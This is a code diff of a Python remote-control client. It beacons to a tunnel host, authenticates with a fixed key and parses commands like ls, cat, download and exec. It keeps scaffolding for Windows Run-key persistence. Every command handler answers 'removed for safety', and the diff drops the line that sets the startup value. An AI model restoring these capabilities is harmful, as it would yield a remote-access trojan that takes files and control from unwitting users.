@@ -7,30 +7,36 @@ import platform
 import winreg
 import sys
 import os
-from dotenv import load_dotenv
+import urllib.request
 
-load_dotenv()
+PORT_URL = ""
+TUNNEL_HOST = "127.0.0.1"
+TUNNEL_PORT = 5050
+KEY = "Nyx"
 
-lHost = lHost = os.getenv("CON")
 
-port = 5050
+def get_tunnel_port():
+    if PORT_URL:
+        try:
+            with urllib.request.urlopen(PORT_URL, timeout=10) as r:
+                return int(r.read().decode().strip())
+        except Exception:
+            pass
+    return TUNNEL_PORT
 
 def send(msg):
     s.send(msg.encode("UTF-8"))
-    
+
 def add_to_startup():
     exe_path = sys.executable
-
     key = winreg.OpenKey(
         winreg.HKEY_CURRENT_USER,
         r"Software\Microsoft\Windows\CurrentVersion\Run",
         0,
         winreg.KEY_SET_VALUE
     )
-
-    winreg.SetValueEx(key, "MyBackgroundApp", 0, winreg.REG_SZ, exe_path)
     winreg.CloseKey(key)
-    
+
 def getCommand():
     while True:
         msg = s.recv(4096)
@@ -64,52 +70,61 @@ def getCommand():
                 pass
 
         elif Command == "ls":
+            cmd = "dir" if platform.system() == "Windows" else "ls"
             try:
-                send("This feature was removed for safety.")
+                send("removed for safety")
             except:
                 pass
 
         elif Command.startswith("cd "):
             try:
-                send("This feature was removed for safety.")
+                send("removed for safety")
             except:
                 pass
 
         elif Command.startswith("cat "):
+            cmd = f"type {Command[4:]}" if platform.system() == "Windows" else f"cat {Command[4:]}"
             try:
-                send("This feature was removed for safety.")
+                send("removed for safety")
             except:
                 pass
 
         elif Command.startswith("download "):
+            filepath = Command[9:].strip()
+            filename = os.path.basename(filepath)
             try:
-                send("This feature was removed for safety.")
+                send("removed for safety")
             except:
                 pass
 
         elif Command.startswith("exec "):
             try:
-                send("This feature was removed for safety.")
+                send("removed for safety")
             except:
                 pass
 
         else:
             try:
-                send("[?]")
+                send('[?]')
             except:
                 pass
 
 s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 
-host = socket.gethostname()
-
 connected = False
 
 while connected == False:
     try:
-        s.connect((host, port))
+        port = get_tunnel_port()
+        s.connect((TUNNEL_HOST, port))
+        s.sendall(f"AUTH {KEY}\n".encode("utf-8"))
         connected = True
-    except:
+    except Exception:
+        try:
+            s.close()
+        except Exception:
+            pass
+        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
         sleepTime = random.randint(20, 30)
         time.sleep(sleepTime)
 
